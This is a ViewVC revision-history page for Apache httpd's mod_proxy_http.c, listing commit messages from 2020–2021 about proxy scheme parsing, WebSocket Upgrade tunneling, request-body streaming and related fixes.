(3 years, 11 months ago)
by *ylavic*

File length: 84359 byte(s)

Diff to [previous 1886141](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1886141&r2=1886151)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1886141&r2=1886151&diff_format=h))
```
mod_proxy_http: follow up to [r1886141](/viewvc?view=revision&revision=1886141), axe overlong scheme check.

Since mod_proxy can see CONNECT URIs, "hostname:port" versus "scheme:"
is hardly distinguishable (we don't want to limit the length of hostnames),
and we don't allocate the scheme anymore while parsing, let's simply decline
unrecognized schemes (overlong or not) and be caught by the no-handler case
if there really is no proxy handler interested.

```

---

Revision [**1886141**](/viewvc?view=revision&revision=1886141) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1886141&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1886141&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1886141))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1886141)

Modified
*Tue Feb 2 19:50:14 2021 UTC*
(3 years, 11 months ago)
by *rpluem*

File length: 84590 byte(s)

Diff to [previous 1885240](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1885240&r2=1886141)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1885240&r2=1886141&diff_format=h))
```
* We need to check for (!scheme && (u = strchr(url, ':')) && (u - url) > 14)
  later as (!scheme || u[0] != '/' || u[1] != '/' || u[2] == '\0') is true
  for requests with the CONNECT method which we need to decline. But in many
  cases requests with the CONNECT method have (u - url) > 14 as in this
  case (u - url) is the length of the FQDN the forward proxy should connect
  to.

```

---

Revision [**1885240**](/viewvc?view=revision&revision=1885240) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1885240&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1885240&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1885240))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1885240)

Modified
*Thu Jan 7 13:38:37 2021 UTC*
(4 years ago)
by *ylavic*

File length: 84610 byte(s)

Diff to [previous 1885239](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1885239&r2=1885240)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1885239&r2=1885240&diff_format=h))
```
mod_proxy_http: follow up to [r1885239](/viewvc?view=revision&revision=1885239): fix *is_ssl for wss scheme.

```

---

Revision [**1885239**](/viewvc?view=revision&revision=1885239) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1885239&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1885239&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1885239))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1885239)

Modified
*Thu Jan 7 13:19:08 2021 UTC*
(4 years ago)
by *ylavic*

File length: 84610 byte(s)

Diff to [previous 1884280](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1884280&r2=1885239)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1884280&r2=1885239&diff_format=h))
```
mod_proxy_wstunnel: leave Upgrade requests handling to mod_proxy_http.

Let mod_proxy_http's canon and scheme handlers accept "ws[s]:" schemes so that
mod_proxy_wstunnel can decline requests when mod_proxy_http is loaded.

* modules/proxy/{mod_proxy.h,proxy_util.c} (ap_proxy_worker_can_upgrade):
  Add a "dflt" argument to ap_proxy_worker_can_upgrade() which, if not NULL,
  is matched when no worker upgrade= parameter is configured. This allows to
  handle the default "Upgrade: websocket" case for "ws[s]:" schemes.

* modules/proxy/mod_proxy_http.c (proxy_http_canon, proxy_http_handler):
  Add and use the new get_url_scheme() helper to parse URL schemes handled by
  mod_proxy_http and use it in canon and scheme handlers. This helper now
  accepts ws[s] schemes.

* modules/proxy/mod_proxy_wstunnel.c (proxy_wstunnel_post_config):
  New post_config hook to detect whether mod_proxy_http is loaded and set
  global fallback_to_mod_proxy_http flag in this case.

* modules/proxy/mod_proxy_wstunnel.c (proxy_wstunnel_check_trans,
                                      proxy_wstunnel_canon,
                                      proxy_wstunnel_handler):
  These hooks now early return DECLINED if fallback_to_mod_proxy_http is set.

```

---

Revision [**1884280**](/viewvc?view=revision&revision=1884280) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1884280&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1884280&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1884280))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1884280)

Modified
*Thu Dec 10 16:04:34 2020 UTC*
(4 years, 1 month ago)
by *ylavic*

File length: 83760 byte(s)

Diff to [previous 1884067](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1884067&r2=1884280)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1884067&r2=1884280&diff_format=h))
```
Revert [r1480058](/viewvc?view=revision&revision=1480058), -1'ed on dev@ and STATUS.

Never backported (and never will supposedly), while often creating
merge conflicts.

See <https://lists.apache.org/thread.html/be0e7bdc3510fddd2dd80accece44917eba361ef4fcc713dd0f7f7fa%401367999236%40%3Cdev.httpd.apache.org%3E>
and <https://lists.apache.org/thread.html/6e63271b308a2723285d288857318e7bb51b6756690514d9bc75a71b%401371148914%40%3Ccvs.httpd.apache.org%3E>

```

---

Revision [**1884067**](/viewvc?view=revision&revision=1884067) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1884067&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1884067&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1884067))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1884067)

Modified
*Thu Dec 3 14:06:17 2020 UTC*
(4 years, 1 month ago)
by *ylavic*

File length: 83775 byte(s)

Diff to [previous 1883639](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1883639&r2=1884067)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1883639&r2=1884067&diff_format=h))
```
mod_proxy: provide prefetching and spooling mechanisms to all proxy modules.

Export ap_proxy_prefetch_input(), ap_proxy_spool_input() and
ap_proxy_read_input() from mod_proxy_http to mod_proxy.h/proxy_util.c so
that they are usable by all proxy modules.

mod_proxy_fcgi will use them in a following commit.

```

---

Revision [**1883639**](/viewvc?view=revision&revision=1883639) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1883639&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1883639&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1883639))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1883639)

Modified
*Thu Nov 19 12:12:04 2020 UTC*
(4 years, 2 months ago)
by *ylavic*

File length: 93385 byte(s)

Diff to [previous 1880204](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1880204&r2=1883639)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1880204&r2=1883639&diff_format=h))
```
Make HTTP_IN filter send 100 continue in blocking mode only.

When mod_proxy_http prefetches input data it calls the HTTP_IN filter
in nonblocking mode, but since it does not want 100 continue to be sent
for every case (e.g. 100-continue forwarding), it hacks r->expecting_100
(save in req->expecting_100, reset, eventually restore..) all over the
place.

Let's avoid this by making the HTTP_IN filter send 100 continue only
when called in blocking mode (once still), instead of the first time
it's called.

* modules/http/http_filters.c (struct http_filter_ctx): Add the seen_data
  bit and rename eos_sent to at_eos (HTTP_IN does not send any EOS).

* modules/http/http_filters.c (ap_http_filter): Move 100 continue
  handling outside the initialization/once block, and do it in blocking
  mode only. Track in ctx->seen_data whether some data were already
  received, and if so don't send 100 continue per RFC 7231 5.1.1.

* modules/proxy/mod_proxy_http.c: Remove req->expecting_100 (and its
  danse with r->expecting_100) now that reading from the input filters
  does the right thing.

```

---

Revision [**1880204**](/viewvc?view=revision&revision=1880204) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1880204&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1880204&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1880204))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1880204)

Modified
*Thu Jul 23 14:03:24 2020 UTC*
(4 years, 6 months ago)
by *ylavic*

File length: 95378 byte(s)

Diff to [previous 1879451](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1879451&r2=1880204)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1879451&r2=1880204&diff_format=h))
```
mod_proxy_http: follow up to [r1879419](/viewvc?view=revision&revision=1879419).

Better ap_proxy_tunnel_run() error handling.

```

---

Revision [**1879451**](/viewvc?view=revision&revision=1879451) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1879451&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1879451&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1879451))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1879451)

Modified
*Thu Jul 2 15:49:53 2020 UTC*
(4 years, 6 months ago)
by *ylavic*

File length: 95418 byte(s)

Diff to [previous 1879449](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1879449&r2=1879451)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1879449&r2=1879451&diff_format=h))
```
Follow up to [r1879449](/viewvc?view=revision&revision=1879449): yet better MPM poll callback API.

Let pass a const pfds to the MPM, for it to make a copy on the given pool
as needed.

```

---

Revision [**1879449**](/viewvc?view=revision&revision=1879449) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1879449&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1879449&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1879449))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1879449)

Modified
*Thu Jul 2 15:06:23 2020 UTC*
(4 years, 6 months ago)
by *ylavic*

File length: 96190 byte(s)

Diff to [previous 1879437](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1879437&r2=1879449)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1879437&r2=1879449&diff_format=h))
```
mpm_common: add pool argument to mpm_register_poll_callback[_timeout] hooks.

This is cleaner API than using pfds->pool implicitely.

MAJOR bump but reusing the existing hooks (with an API/ABI breakage) because
it's trunk material only.

```

---

Revision [**1879437**](/viewvc?view=revision&revision=1879437) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1879437&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1879437&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1879437))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1879437)

Modified
*Thu Jul 2 12:15:57 2020 UTC*
(4 years, 6 months ago)
by *ylavic*

File length: 96010 byte(s)

Diff to [previous 1879419](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1879419&r2=1879437)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1879419&r2=1879437&diff_format=h))
```
mod_proxy_http: follow up to [r1879419](/viewvc?view=revision&revision=1879419): clarify poll callback pds/subpool.

Comments about why we need a dedicated pfds and its subpool for
ap_mpm_register_poll_callback_timeout().

```

---

Revision [**1879419**](/viewvc?view=revision&revision=1879419) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1879419&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1879419&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1879419))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1879419)

Modified
*Thu Jul 2 00:14:26 2020 UTC*
(4 years, 6 months ago)
by *ylavic*

File length: 95496 byte(s)

Diff to [previous 1879401](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1879401&r2=1879419)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1879401&r2=1879419&diff_format=h))
```
mod_proxy_http: handle async tunneling of Upgrade(d) protocols.

When supported by the MPM (i.e. "event"), provide async callbacks and let
them be scheduled by ap_mpm_register_poll_callback_timeout(), while the
handler returns SUSPENDED.

The new ProxyAsyncDelay directive (if positive) enables async handling,
while ProxyAsyncIdleTimeout determines the timeout applied on both ends
while tunneling.

Github: closes #126

```

---

Revision [**1879401**](/viewvc?view=revision&revision=1879401) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1879401&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1879401&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1879401))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1879401)

Modified
*Wed Jul 1 16:35:48 2020 UTC*
(4 years, 6 months ago)
by *ylavic*

File length: 91970 byte(s)

Diff to [previous 1878991](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1878991&r2=1879401)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1878991&r2=1879401&diff_format=h))
```
mod_proxy: improved and reentrant tunneling loop.

modules/proxy/mod_proxy.h:
    Rename AP_PROXY_TRANSFER_SHOULD_YIELD to AP_PROXY_TRANSFER_YIELD_PENDING
    and add AP_PROXY_TRANSFER_YIELD_MAX_READS.

modules/proxy/mod_proxy_http.c:
modules/proxy/mod_proxy_wstunnel.c:
    Removing of reqtimeout filter is now handled by ap_proxy_tunnel_create().

modules/proxy/proxy_util.c:
    ap_proxy_transfer_between_connections():
        Reorganize loop to break out early.
        When AP_PROXY_TRANSFER_YIELD_PENDING, if !ap_filter_should_yield() we
        still need to run and check ap_filter_output_pending() since it may
        release pending data.
        When AP_PROXY_TRANSFER_YIELD_MAX_READS, stop the loop after too much
        reads (PROXY_TRANSFER_MAX_READS = 10000) to release the thread and
        give the caller a chance to schedule the other direction.
        Don't return APR_INCOMPLETE when it comes from an incomplete body
        detected by ap_http_filter().

    ap_proxy_tunnel_create():
        Start with POLLOUT on both directions so that any pending output data
        is flushed first.

    ap_proxy_tunnel_run():
        Remove re-init/clear of the pollset for each call so that the function
        is reentrant.
        Handle POLLOUT before POLLIN so that we can read in the same pass once
        all buffered output data are flushed, using ap_filter_input_pending()
        to drain buffered input data.

This is preparatory patch for async websocket tunneling is mod_proxy_http.

```

---

Revision [**1878991**](/viewvc?view=revision&revision=1878991) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1878991&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1878991&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1878991))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1878991)

Modified
*Fri Jun 19 14:52:08 2020 UTC*
(4 years, 7 months ago)
by *ylavic*

File length: 92196 byte(s)

Diff to [previous 1878367](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1878367&r2=1878991)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1878367&r2=1878991&diff_format=h))
```
mod_proxy_http: always stream the request body by default.

Simplify streaming by using Content-Length if the length is available, or
chunked Transfer-Encoding otherwise.

Spooling to memory/file will only be used if force-proxy-request-1.0 or
proxy-sendcl are set.

This removes the handling of proxy-sendchunked and proxy-sendchunks.

```

---

Revision [**1878367**](/viewvc?view=revision&revision=1878367) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1878367&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1878367&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1878367))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1878367)

Modified
*Mon Jun 1 15:40:03 2020 UTC*
(4 years, 7 months ago)
by *ylavic*

File length: 93503 byte(s)

Diff to [previous 1878280](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1878280&r2=1878367)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1878280&r2=1878367&diff_format=h))
```
mod_proxy_http: put request/response splitting checks under the same comment.

If stream_reqbody() detects a Content-Length vs bytes streamed mismatch it
means that a module's filter played bad games, such inconsistency on the client
connection would have been caught by ap_http_filter().

So move AH01087 logic to AH01086, under the same comment and log message, and
always return HTTP_INTERNAL_SERVER because the client is not the culprit here.

```

---

Revision [**1878280**](/viewvc?view=revision&revision=1878280) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1878280&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1878280&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1878280))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1878280)

Modified
*Fri May 29 17:05:29 2020 UTC*
(4 years, 7 months ago)
by *ylavic*

File length: 93402 byte(s)

Diff to [previous 1877954](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1877954&r2=1878280)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1877954&r2=1878280&diff_format=h))
```
mod_proxy_http: don't strip EOS when spooling request body to file.

To prevent stream_reqbody() from sending the FILE and FLUSH bucket in separate
brigades, and thus apr_file_setaside() to trigger if network congestion occurs
with the backend, restore the EOS in spool_reqbody_cl() which was stripped
when spooling the request body to a file.

Until APR [r1878279](/viewvc?view=revision&revision=1878279) is released (and installed by users), apr_file_setaside()
on a temporary file (mktemp) will simply drop the file cleanup, leaking the
fd and inode..

This fixes BZ 64452.

```

---

Revision [**1877954**](/viewvc?view=revision&revision=1877954) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1877954&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1877954&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1877954))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1877954)

Modified
*Wed May 20 14:01:17 2020 UTC*
(4 years, 8 months ago)
by *ylavic*

File length: 93108 byte(s)

Diff to [previous 1877697](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1877697&r2=1877954)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1877697&r2=1877954&diff_format=h))
```
core,modules: provide/use ap_parse_strict_length() helper.

It helps simplifying a lot of duplicated code based on apr_strtoff(), while
also rejecting leading plus/minus signs which are dissalowed in Content-Length
and (Content-)Range headers.

```

---

Revision [**1877697**](/viewvc?view=revision&revision=1877697) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1877697&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1877697&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1877697))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1877697)

Modified
*Wed May 13 15:00:06 2020 UTC*
(4 years, 8 months ago)
by *ylavic*

File length: 93209 byte(s)

Diff to [previous 1877696](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1877696&r2=1877697)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1877696&r2=1877697&diff_format=h))
```
mod_proxy_http: follow up to [r1877696](/viewvc?view=revision&revision=1877696): reindent.

No functional changes.

```

---

Revision [**1877696**](/viewvc?view=revision&revision=1877696) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1877696&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1877696&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1877696))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1877696)

Modified
*Wed May 13 14:54:51 2020 UTC*
(4 years, 8 months ago)
by *ylavic*

File length: 93889 byte(s)

Diff to [previous 1877695](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1877695&r2=1877696)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1877695&r2=1877696&diff_format=h))
```
mod_proxy_http: axe ap_proxy_should_override() duplicate checks.

```

---

Revision [**1877695**](/viewvc?view=revision&revision=1877695) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1877695&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1877695&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1877695))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1877695)

Modified
*Wed May 13 14:25:25 2020 UTC*
(4 years, 8 months ago)
by *ylavic*

File length: 94015 byte(s)

Diff to [previous 1877646](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1877646&r2=1877695)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1877646&r2=1877695&diff_format=h))
```
mod_proxy_http: follow up to [r1877646](/viewvc?view=revision&revision=1877646): send Upgrade header with 101 response.

Also, add a comment about why we forward the Upgrade header in non-101
responses provided the protocol matches the upgrade= configuration.

```

---

Revision [**1877646**](/viewvc?view=revision&revision=1877646) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1877646&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1877646&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1877646))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1877646)

Modified
*Tue May 12 12:20:57 2020 UTC*
(4 years, 8 months ago)
by *ylavic*

File length: 93189 byte(s)

Diff to [previous 1877558](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1877558&r2=1877646)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1877558&r2=1877646&diff_format=h))
```
mod_proxy_http: handle Upgrade requests and upgraded protocol forwarding.

If the request Upgrade header matches the worker upgrade= parameter and
the backend switches the protocol, do the tunneling in mod_proxy_http.
This allows to keep the protocol to HTTP until the backend really
switches the protocol, and apply usual output filters.

When configured to forward Upgrade mechanism, we want the backend to be
able to announce its Upgrade protocol to the client (e.g. with 426
Upgrade Required response) and thus forward back the Upgrade header that
matches the one(s) configured in the worker upgrade= parameter.

modules/proxy/mod_proxy.h:
modules/proxy/proxy_util.c:
    ap_proxy_worker_can_upgrade(): added helper to determine whether a
    proxy worker is configured to forward an Upgrade protocol.

include/ap_mmn.h:
    Bump MMN minor for ap_proxy_worker_can_upgrade().

modules/proxy/mod_proxy.c:
    set_worker_param(): handle worker parameter upgrade=ANY as upgrade=*
    (should the "any" protocol scheme be something some day..).

modules/proxy/mod_proxy_wstunnel.c:
    proxy_wstunnel_handler(): use ap_proxy_worker_can_upgrade() to match
    the Upgrade header. Axe handling of upgrade=NONE, it makes no sense to
    Upgrade a connection if the client did not ask for it, nor to configure
    mod_proxy_wstunnel to use a worker with upgrade=NONE by the way.

modules/proxy/mod_proxy_http.c:
    proxy_http_req_t: add fields force10 (force HTTP/1.0) and upgrade (value
    of the Upgrade header sent by the client if it matches the configuration,
    NULL otherwise).
    proxy_http_handler(): use ap_proxy_worker_can_upgrade() to determine
    whether the request is electable for end to end protocol upgrading and set
    req->upgrade accordingly.
    terminate_headers(): handle Connection and Upgrade headers to send to the
    backend, according to req->force10 and req->upgrade set before.
    ap_proxy_http_prefetch(): use req->force10 and terminate_headers().
    send_continue_body(): added helper to send the body retained for end to
    end 100-continue handling.
    ap_proxy_http_process_response(): use ap_proxy_worker_can_upgrade() to
    match the response Upgrade header and forward it back if it matches the
    configured one(s). That is for 101 Switching Protocol obviously but also
    any other status code which is not overidden, at the backend wish. If the
    protocol is switching, create a proxy tunnel and run it, using the minimal
    timeout from the client or backend connection.

Github: closes #125

```

---

Revision [**1877558**](/viewvc?view=revision&revision=1877558) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1877558&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1877558&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1877558))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1877558)

Modified
*Sun May 10 21:23:14 2020 UTC*
(4 years, 8 months ago)
by *ylavic*

File length: 88784 byte(s)

Diff to [previous 1877557](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1877557&r2=1877558)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1877557&r2=1877558&diff_format=h))
```
mod_proxy_http: follow up to [r1877557](/viewvc?view=revision&revision=1877557).

Yet better, call proxy_run_detach_backend() at the caller.

```

---

Revision [**1877557**](/viewvc?view=revision&revision=1877557) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1877557&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1877557&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1877557))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1877557)

Modified
*Sun May 10 20:52:30 2020 UTC*
(4 years, 8 months ago)
by *ylavic*

File length: 89146 byte(s)

Diff to [previous 1876599](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1876599&r2=1877557)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1876599&r2=1877557&diff_format=h))
```
mod_proxy_http: single point of failure in ap_proxy_http_process_response().

No functional change (intended).

```

---

Revision [**1876599**](/viewvc?view=revision&revision=1876599) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1876599&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1876599&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1876599))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1876599)

Modified
*Thu Apr 16 12:32:33 2020 UTC*
(4 years, 9 months ago)
by *ylavic*

File length: 89118 byte(s)

Diff to [previous 1876404](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1876404&r2=1876599)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1876404&r2=1876599&diff_format=h))
```
Add missing pool tags to help debugging.

```

---

Revision [**1876404**](/viewvc?view=revision&revision=1876404) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1876404&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1876404&view=co))
